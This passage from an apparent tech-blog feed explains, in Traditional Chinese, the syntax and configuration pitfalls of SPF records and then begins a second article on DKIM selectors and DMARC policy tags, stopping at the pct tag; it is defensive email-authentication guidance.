&lt;li&gt;&lt;code&gt;all&lt;/code&gt; 後面的任何標籤均會被忽略&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?all, +all&lt;/code&gt;：不管前面有沒有對到，都視為 pass。SPF 跟沒設一樣。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;ip4%2C-ip6&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#ip4%2C-ip6&quot;&gt;#&lt;/a&gt; ip4, ip6&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;[qualifier]ip4:target-ip[cidr-length]&lt;/code&gt; 或 &lt;code&gt;[qualifier]ip6:target-ip[cidr-length]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;分別用 ipv4 與 ipv6 定義的 IP 列表，只要是 CIDR 表示法都可以，例如 &lt;code&gt;192.168.0.1/16&lt;/code&gt;。斜線後的 prefix length 如果省略，會預設為 &lt;code&gt;/32&lt;/code&gt;（ipv4）與 &lt;code&gt;/128&lt;/code&gt;（ipv6）。&lt;/p&gt;
&lt;p&gt;地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不合法的 IP：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;a&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#a&quot;&gt;#&lt;/a&gt; a&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;[qualifier]a:[target-domain][cidr-length]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;檢查 sender IP 是否在 target-domain 的 A 或 AAAA 紀錄中，即是否為 target-domain 所擁有的 IP。如果沒有寫 target-domain 就會默認為當前 SPF 紀錄的網域， &lt;code&gt;a&lt;/code&gt; 等同 &lt;code&gt;a:sender-domain&lt;/code&gt;。&lt;/p&gt;
&lt;h5 id=&quot;mx&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#mx&quot;&gt;#&lt;/a&gt; mx&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;[qualifier]mx:[target-domain][cidr-length]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;檢查 sender IP 是否在 target-domain 的 MX 紀錄中。如果沒有寫 target-domain 就會默認為當前 SPF 紀錄的網域， &lt;code&gt;mx&lt;/code&gt; 等同 &lt;code&gt;mx:sender-domain&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若一個 MX 紀錄包含超過 10 個 A 或 AAAA 紀錄：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89&quot;&gt;#&lt;/a&gt; ptr （已廢棄）&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;[qualifier]ptr:[target-domain]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;進行 reverse DNS lookup，若得到的網域是 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 或其子網域，則 pass。此機制速度慢且會 .arpa name servers 的負擔，請勿使用。&lt;/p&gt;
&lt;p&gt;地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若一個 PTR 紀錄包含超過 10 個 A 或 AAAA 紀錄，只看前十個後面忽略&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;exists&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#exists&quot;&gt;#&lt;/a&gt; exists&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;[qualifier]exists:target-domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;若 target-domain 存在 A 紀錄，視為 pass。&lt;/p&gt;
&lt;h5 id=&quot;include&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#include&quot;&gt;#&lt;/a&gt; include&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;[qualifier]include:target-domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;跟寫程式呼叫另一個函數的概念類似，會檢查 target-domain 的 SPF 紀錄並且一直遞迴查詢下去，直到比對過每一個 IP。但 include 不代表把對方的 SPF 紀錄 inline 插入自己的，而是跳到對方的 SPF 紀錄的 context 中比對，最後得到 match、 not-match、或 error 的結果。&lt;/p&gt;
&lt;p&gt;在遞迴過程中，子紀錄的驗證結果對母紀錄的 include 機制的影響為：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Pass&lt;/code&gt;→ include 判定：match&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Fail, Softfail, Neutral&lt;/code&gt;→ include 判定：not-match&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PermError, None&lt;/code&gt;→ include 判定：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TempError&lt;/code&gt;→ include 判定：&lt;code&gt;TempError&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;include 機制適合用在核准外部（跨域）的 email provider，例如當我們使用第三方寄件服務時，就要把對方的 SPF 紀錄用 include 機制放到我們的SPF 紀錄。&lt;/p&gt;
&lt;h3 id=&quot;modifiers&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#modifiers&quot;&gt;#&lt;/a&gt; Modifiers&lt;/h3&gt;
&lt;p&gt;2 種修飾為： &lt;code&gt;redirect, exp&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&quot;redirect&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#redirect&quot;&gt;#&lt;/a&gt; redirect&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;redirect:target-domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;必須在紀錄最末，與 all 不可同時出現。若前面的 mechanism 驗證完畢但都沒有找到 match，就用 target-domain 的 SPF 紀錄取代自己的。與 include 的母子關係不同，這裡用 inline 概念插入，所以任何報錯視為當前 SPF 紀錄的 Error。&lt;/p&gt;
&lt;p&gt;地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若 target-domain 沒有 SPF 紀錄：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;all&lt;/code&gt; 與 &lt;code&gt;redirect&lt;/code&gt; 只能出現一個，若紀錄中兩者同時出現則 &lt;code&gt;redirect&lt;/code&gt; 會被忽略&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;exp&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#exp&quot;&gt;#&lt;/a&gt; exp&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;exp:target-domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;代表 explanation，若 SPF 紀錄驗證結果為 &lt;code&gt;Fail&lt;/code&gt;，會返回 target-domain 的 TXT 紀錄內的字串。&lt;/p&gt;
&lt;p&gt;地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若在 include 的 target-domain 的 SPF 紀錄中找到 exp，會忽略（母子關係）；若在 redirect 的 target-domain 的 SPF 紀錄中找到 exp，則會忽略原紀錄的 exp（取代關係）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A&quot;&gt;#&lt;/a&gt; 其他地雷：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DNS 回傳 NXDOMAIN（沒有 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 這個網域）：&lt;code&gt;None&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;找到複數筆 SPF 紀錄：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SPF 紀錄開頭不是 &lt;code&gt;v=spf1&lt;/code&gt;：&lt;code&gt;None&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SPF 紀錄被設成 SPF 類型而不是 TXT 類型：SPF 類型作為 SPF 機制發展的過渡期使用，目前已廢棄，處理方式未定義&lt;/li&gt;
&lt;li&gt;任何語法錯誤，例如 mechanism 或 modifier 拼錯字，或是中間多了空格等：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;DNS 查詢 timeout 、server failure 等除了 success 與 nxdomain 的結果：&lt;code&gt;TempError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;發生大於兩次 void lookup，也就是 DNS query 回傳空白結果（success 與 nxdomain）：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;涵括除了 &lt;code&gt;all, ip4, ip6, exp&lt;/code&gt;之外的所有標籤，以及往下遞迴時需要的 DNS query，總計超過 10 次 DNS lookup：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;若 redirect 或 include 的網域有重複（例如 SPF 紀錄有：&lt;code&gt;include: a.com include:b.com&lt;/code&gt; 但是 &lt;a href=&quot;http://a.com/&quot;&gt;a.com&lt;/a&gt; 的 SPF 紀錄內已經有 &lt;code&gt;include:b.com&lt;/code&gt;）或是 loop（a include b → b include c → c include a）的情況，不會報錯，但很可能會導致超過 10 次 DNS lookup&lt;/li&gt;
&lt;li&gt;若驗證一筆 SPF 紀錄需要超過 20 秒：&lt;code&gt;TempError&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;每個 modifier 在 SPF 紀錄只能各出現一次，若超過：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 多個子網域&lt;/h3&gt;
&lt;p&gt;如果你有多個會寄信的網域，就要為每一個分別設置 SPF 紀錄。如果它們是從同一個 email server 寄出去的，可以用 redirect 統一指向一筆紀錄，方便管理。&lt;/p&gt;
&lt;p&gt;不寄信的網域（parked domain）請設置 &lt;code&gt;v=spf1 -all&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99&quot;&gt;#&lt;/a&gt; 第三方服務&lt;/h3&gt;
&lt;p&gt;如果你有使用第三方的寄件服務，例如 SendGrid，你可以在 SPF 紀錄中用 include 機制把第三方的 email server 涵蓋進來，例如 OneDegree 使用微軟 Outlook、MailChimp、FreshDesk、SendGrid 等服務：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;眼尖的人可能會發現，上面的紀錄怎麼少了 &lt;code&gt;include:sendgrid.net&lt;/code&gt;？&lt;/p&gt;
&lt;p&gt;其實，你如果去查這幾個第三方服務的的 SPF 紀錄就會發現，FreshDesk 的 SPF 紀錄就已經有 &lt;code&gt;include:sendgrid.net&lt;/code&gt; 這一行，因此我們就不用加啦！這樣也可以省下一筆 DNS lookup 的扣打，畢竟 10 次 DNS lookup 是很容易超過的。&lt;/p&gt;
&lt;p&gt;這裡也順便回答一個非常常見的問題：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;『超過 10 次 DNS lookup 怎麼辦』&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;只要你多用幾個第三方寄件服務，馬上就超過 10 次了，畢竟你 include 他算一次，他用到的 include、a、mx 等等也通通算你的！還不含你自己的一些 email server 呢！&lt;/p&gt;
&lt;p&gt;解決這個問題有幾個撇步：&lt;/p&gt;
&lt;p&gt;如果你有 lookup 到你自己的一些 email server，可以考慮用 ip4 ip6 直接 inline 插進來，例如：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;// before  &lt;br&gt;mydom.com -&gt; include:sub1.mydom.com mx:sub2.mydom.com include:a.com  &lt;br&gt;sub1.mydom.com(SPF) -&gt; ip4:192.x.x.3 ip4:172.x.x.x/16  &lt;br&gt;sub2.mydom.com(MX) -&gt; 192.x.126.5&lt;br&gt;&lt;br&gt;//after  &lt;br&gt;mydom.com -&gt; ip4:192.x.x.3 ip4:172.x.x.x/16 ip4:192.x.126.5 include:a.com&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者，可以考慮把這個寄信的 domain 拆成幾個不同功用的 subdomain 然後把第三方寄件服務也依據用途瓜分下去，這樣每個 domain 都有自己的 10 次扣打。例如：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;// before  &lt;br&gt;mydomain.com -&gt; include:a.com include:b.com include:c.com &lt;br&gt;&lt;br&gt;//after  &lt;br&gt;mydomain.com -&gt; include:a.com   &lt;br&gt;customer.mydomain.com -&gt; include:b.com   &lt;br&gt;partnership.mydomain.com -&gt; include:c.com&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果你很不幸地用到了一個第三方服務，他自己的 SPF 紀錄就要用到快 10 次 lookup，那只能說….換一個吧？（或是聯繫對方看看他們有什麼建議啦）&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h2&gt;
&lt;p&gt;恭喜大家搞懂三劍客裡最難設定的 SPF 啦！你可以在網路上找到的 SPF 紀錄檢查器通常不會把我們討論的地雷全都檢查一次，因為實在是太麻煩啦QQ 推薦你可以多用幾種工具配著這篇仔細檢視一下你的 SPF 紀錄，然後跟著下一篇設好 DMARC 後，就可以在每日的彙整報告中看到 SPF 通過跟失敗的紀錄囉！&lt;/p&gt;
&lt;h3 id=&quot;reference%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#reference%3A&quot;&gt;#&lt;/a&gt; Reference:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7208&quot;&gt;SPF RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc6376&quot;&gt;DKIM RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7489&quot;&gt;DMARC RFC&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>關於 email security 的大小事 — 設定篇 DKIM、DMARC</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/"/>
		<updated>2021-07-15T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;接續著前一篇，我們來講講 DKIM 跟 DMARC 的設定。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;老話一句，這裡的『設定』並不是回答你『如何在 google 或是 Office365 設好這些紀錄』、『用 XX 服務結果信寄不到怎麼辦』，這種操作配置的教學文請參考官方文件，畢竟 email provider 千千百百家，各自可能有的問題更是難以彙整。&lt;/p&gt;
&lt;p&gt;我想告訴你的『設定』是 SPF、DMARC 的 DNS 紀錄本身有哪些標籤，以及設置這些選項時可能不小心踩到哪些地雷，導致收信方的 email server 在驗證你的郵件時出現非預期地報錯，而判斷驗證失敗。另外，也會告訴你如果有多個子網域，或有使用第三方寄信服務時該怎麼辦。&lt;/p&gt;
&lt;p&gt;總之，可以想成是回答你『我該怎麼理解這些紀錄』和『每個機制有哪些選項跟限制』，而不是針對單一 email provider 的教學文。&lt;/p&gt;
&lt;p&gt;有不懂或是想了解更多範例與延伸議題，請看本系列其他篇～&lt;br&gt;
如果你還不太懂 SPF、DKIM、DMARC 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory&quot;&gt;關於 email security 的大小事 — 原理篇&lt;/a&gt;&lt;br&gt;
如果你在找 SPF 的設定 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf&quot;&gt;關於 email security 的大小事 — 設定篇 SPF&lt;/a&gt;&lt;br&gt;
如果你想搭配設定範例 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples&quot;&gt;關於 email security 的大小事 — 範例篇&lt;/a&gt;&lt;br&gt;
如果你想了解延伸議題 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra&quot;&gt;關於 email security 的大小事 — 延伸篇&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;dkim&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dkim&quot;&gt;#&lt;/a&gt; DKIM&lt;/h2&gt;
&lt;p&gt;我們先從 DKIM 開始，因為對設置者來說，他是標籤彈性最小、可控選項最少的驗證機制，所以也不太容易出錯。&lt;/p&gt;
&lt;p&gt;回顧我們在原理篇看到的 DKIM signature，裡面有非常多欄位，包含版本、加密法、時間戳、網域等等。舉例來說，當收信方的 email server 看到下圖這個 DKIM signature，就會用裡面的 &lt;code&gt;s=brisbane,d=example.net&lt;/code&gt; 組合出 DKIM 公鑰發行的網域：&lt;code&gt;brisbane._domainkey.example.net&lt;/code&gt;，再用找到的公鑰解密 &lt;code&gt;bh&lt;/code&gt;（body hash） 來比對雜湊（hash），進而驗證信件真實性。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/dkim-signature.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;DKIM signature（取自 維基百科）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一般來說，你的 email provider 都會提供給你產生 DKIM 的工具，裡面的網域名稱、加密演算法等等都不能更改，可以配置的通常只有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;金鑰長度：1024 或是 2048 位元。&lt;/li&gt;
&lt;li&gt;prefix selector：也就是欄位中的 &lt;code&gt;s&lt;/code&gt;，會跟 &lt;code&gt;d&lt;/code&gt; 一起用於 DNS 查詢，用來辨識不同的 DKIM 公鑰。這個值可以是任何字串，不過因為是用來組成發布 DKIM 紀錄的網域名，所以 &lt;code&gt;(s,d)&lt;/code&gt; 必須是 unique 的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;設定完成後就把公鑰發布在 &lt;code&gt;&amp;lt;selector&amp;gt;._domainkey.&amp;lt;domain&amp;gt;&lt;/code&gt; 這個網域下，以 onedegree 為例，存在如下的一筆 DKIM 紀錄：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-settings-dkimdmarc/onedegree-dkim.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;OneDegree DKIM&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;根據 RFC，DKIM signature 產生於 Administrative Management Domains (ADMDs)，在信件的 creation 與 relay 均可能發生，也就是說一封信件可能是經過多次簽名的，例如我們之前提過的轉發（forwarding）就會保留原始信件的簽章並且加上中繼 email server 自己的的簽章。當信件內有多個 DKIM signature，每一個都會被驗證，不過只需要其中一個同時符合 verification 跟 alignment，DMARC 就會判定為 pass。&lt;/p&gt;
&lt;h3 id=&quot;%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 多個子網域&lt;/h3&gt;
&lt;p&gt;如果你有多個會寄信的網域，就要為每一個分別設置 DKIM，只要他們的 selector 不同即可。例如你設置了以下兩個網域：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mydom.com&lt;/code&gt;： &lt;code&gt;selector=happy, DNS at happy._domainkey.mydom.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sub.mydom.com&lt;/code&gt;： &lt;code&gt;selector=sad, DNS at sad._domainkey.sub.mydom.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那麼不同網域簽署寄出去的信會用各自的私鑰，驗證時也會查詢到對應的公鑰，一切順利。&lt;/p&gt;
&lt;h3 id=&quot;%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99&quot;&gt;#&lt;/a&gt; 第三方服務&lt;/h3&gt;
&lt;p&gt;如果你有使用第三方的寄件服務，例如 SendGrid，他們會為你創造一把 DKIM 公私鑰，用自己的網域（例如 &lt;code&gt;sendgrid.net&lt;/code&gt;）發布公鑰，再給你一筆 CNAME 型別的 DKIM 紀錄：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;happy._domainkey.mydom.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;這樣收信方要驗證你由 SendGrid 發出的信時，就會先查詢 &lt;code&gt;happy._domainkey.mydom.com&lt;/code&gt;，然後被導到實際帶有公鑰的網域 &lt;code&gt;s1.domainkey.uXXX.wlXXX.sendgrid.net&lt;/code&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;dmarc&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dmarc&quot;&gt;#&lt;/a&gt; DMARC&lt;/h2&gt;
&lt;p&gt;最後是 DMARC 啦～ 跟 SPF 比起來，DMARC 雖然標籤也不少，但地雷少得多，而且寄送報告的功能也能方便我們 debug 驗證失敗的郵件到底是哪裡出了問題。&lt;/p&gt;
&lt;p&gt;原理篇提過，DMARC 是建立在 SPF 與 DKIM 之上的大一統防線，所以當然是要先設好 SPF 與 DKIM 囉！那如果今天沒有把這兩個都設定好，難道 DMARC 就一定會 fail 嗎？&lt;/p&gt;
&lt;p&gt;其實也不會，你只是無法享受到完整的保護而已。DMARC 只會以有設置的機制判斷，所以假設只有設 SPF，那 DMARC 就只會對 SPF 做驗證跟 alignment 檢查，DKIM 會被自動忽略，這封信雖然一樣會寄到使用者信箱，但就不保證信件內容的真實性了。&lt;/p&gt;
&lt;p&gt;DMARC 運作流程可以用下面這張 RFC 裡定義的 flowchart 表示，重點注意紅色框框的部分。點點（…）代表 DNS query，星星（***）代表有 data exchange，所以可以看到 DMARC 是先得到 SPF 與 DKIM 的結果，再跟 author domain 進行 DNS query 拿到 DMARC 紀錄，如果成功找到紀錄就配合 SPF 與 DKIM 的結果得出 DMARC 驗證的結論，最後把驗證結果交給 MDA 做信件的過濾。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-settings-dkimdmarc/flowchart.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Flowchart from RFC&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;DMARC 驗證結果也會在原始信件裡留下紀錄。下圖紅框的地方分別是 SPF 與 DKIM 的驗證加上 alignment 檢查的結果，最後的 compauth 則是 DMARC 本身的驗證結果。因為 SPF 與 DKIM 都是 pass，所以 DMARC 也是 pass。&lt;/p&gt;
&lt;p&gt;另外，只要 SPF &lt;strong&gt;或&lt;/strong&gt; DKIM 通過 alignment 檢查就可以，不用兩個都符合！&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-settings-dkimdmarc/dmarc-result.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;DMARC result&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接下來進入設定的部分。&lt;/p&gt;
&lt;p&gt;首先請注意，DMARC 設置的網域跟 SPF 不同，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你的網域是 &lt;code&gt;mydom.com&lt;/code&gt;，那 DMARC 就是在 &lt;code&gt;_dmarc.mydom.com&lt;/code&gt; 這個子網域下的一筆 TXT 紀錄，放在 &lt;code&gt;mydom.com&lt;/code&gt; 是無效的！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;值得補充的一點是，做 DNS query 的時候，如果沒在當前的網域找到 DMARC 紀錄，就會往上一層去找 organizational domain 的 DMARC 紀錄。所以假設你是用某個子網域（&lt;code&gt;mailing.mydom.com&lt;/code&gt;）寄信，那當 &lt;code&gt;_dmarc.mailing.mydom.com&lt;/code&gt; 沒有 DMARC 紀錄時，就會去抓 &lt;code&gt;_dmarc.mydom.com&lt;/code&gt; 的，不過這時用的 policy 就會是 subdomain policy（請看下面的 &lt;code&gt;sp&lt;/code&gt; 標籤）。這個特性允許我們更方便地設置跟監控 DMARC，不用特別為每個子網域重新設定一筆紀錄。&lt;/p&gt;
&lt;p&gt;再來我們看看 DMARC 有哪些標籤吧！標籤與標籤值之間皆以一個等號（&lt;code&gt;=&lt;/code&gt;）區隔，中間不可以有任何空白。如果在解析 DMARC 紀錄的時候發生語法錯誤，例如：錯字、不在定義內的未知標籤或標籤值、重複的標籤、大小寫錯誤等等，都會直接被忽略。也就是說，出錯的地方會被套用預設標籤值，而這個預設值通常是最寬鬆、保護效果最差的。&lt;/p&gt;
&lt;p&gt;以下依據用途簡單分類了標籤，除了開頭必須是 &lt;code&gt;v=DMARC1&lt;/code&gt; 並緊接唯一的必要標籤 &lt;code&gt;p&lt;/code&gt; 之外，其他標籤都是 optional ，且順序是沒有規定的。&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C&quot;&gt;#&lt;/a&gt; 政策相關&lt;/h3&gt;
&lt;h5 id=&quot;p&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#p&quot;&gt;#&lt;/a&gt; p&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;p=action&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;即 policy，也就是當 DMARC 驗證結果為 fail 時該採取的行動（action）。不過，這個 action 在 RFC 定義裡只是建議收信方遵照寄信方的意志而非強制（SHOULD … adhere ），實際的 action 仍由 MDA 決定。&lt;/p&gt;
&lt;p&gt;可能的標籤值為：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;reject&lt;/code&gt;：指示於 SMTP 層做 rejection。可能是會回到 bounce address、回覆 SMTP client 一個 5XY error code（ex: 550）、或是回覆傳送成功但默默丟掉（discard）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;quarantine&lt;/code&gt;：指示收信方應將信件視為可疑（suspicious）。可能的處理方式包含：放到垃圾信件夾、集中到檢疫中心（quarantine center）等待管理員查看、送入信箱但加註某種標籤等等。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;none&lt;/code&gt;：不指示任何 action。由收信方自由決定。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在設置上建議採用最嚴格的 &lt;code&gt;reject&lt;/code&gt;，不過實務上為避免設定有誤而導致信件突然都寄不到，造成營運上的影響，許多 email provider 會建議第一次設定 DMARC 時先用 &lt;code&gt;none&lt;/code&gt;，觀察幾天的 DMARC report 以及信件原始內容的驗證結果，再逐漸調整成 &lt;code&gt;quarantine&lt;/code&gt; 跟 &lt;code&gt;reject&lt;/code&gt;。&lt;/p&gt;
&lt;h5 id=&quot;sp&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#sp&quot;&gt;#&lt;/a&gt; sp&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;sp=action&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;即 subdomain policy，概念與語法皆同上面的 &lt;code&gt;p&lt;/code&gt;。使用場景如前面說過的，用子網域 &lt;code&gt;mailing.mydom.com&lt;/code&gt; 寄信，但 &lt;code&gt;_dmarc.mailing.mydom.com&lt;/code&gt; 沒有 DMARC 紀錄，這時會採用最上層 &lt;code&gt;_dmarc.mydom.com&lt;/code&gt; 的紀錄（如果存在），且採用 subdomain policy 定義的 action。&lt;/p&gt;
&lt;p&gt;如果沒有定義 &lt;code&gt;sp&lt;/code&gt;，預設會跟 &lt;code&gt;p&lt;/code&gt; 一樣。&lt;/p&gt;
&lt;h5 id=&quot;pct&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#pct&quot;&gt;#&lt;/a&gt; pct&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;pct=num&lt;/code&gt;&lt;/p&gt;
